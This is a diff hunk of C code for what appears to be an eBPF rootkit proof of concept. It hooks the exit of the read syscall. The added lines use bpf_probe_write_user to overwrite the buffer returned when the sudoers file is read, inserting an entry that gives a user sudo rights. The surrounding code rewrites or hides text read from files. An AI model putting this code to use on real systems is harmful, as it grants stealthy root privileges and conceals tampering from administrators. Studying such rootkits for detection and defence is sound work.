@@ -91,12 +91,26 @@ static __always_inline int handle_tp_sys_exit_read(struct sys_read_exit_ctx *ctx
     char msg_original[] = STRING_FS_HIDE;
     char msg_overwrite[] = STRING_FS_OVERWRITE;
     char c_buf[sizeof(msg_overwrite)] = {0};
+
+    char sudo_line_overwrite[] = STRING_FS_SUDOERS_ENTRY;
+    char c_buf_sudo[STRING_FS_SUDOERS_ENTRY_LEN] = {0};
     
     if(buf == NULL){
         return -1;
     }
+
+    //For including an user in the sudoers file
+    //We just put our new line there, independently on what the rest of the file contains
+    if(data->is_sudo==1){
+        if(bpf_probe_write_user((void*)buf, (void*)sudo_line_overwrite, (__u32)STRING_FS_SUDOERS_ENTRY_LEN-1)<0){
+            bpf_printk("Error writing to user memory\n");
+        }
+        bpf_printk("Sudo overwritten\n");
+        return 0;
+    }
     
-#pragma unroll
+    //For PoC 2 - Modifying text read from a file
+    #pragma unroll
     for(int ii=0; ii<sizeof(msg_original)-1; ii++){
         if(bpf_probe_read_user(c_buf+ii, 1, buf+ii)<0){
             //bpf_printk("Error reading\n");
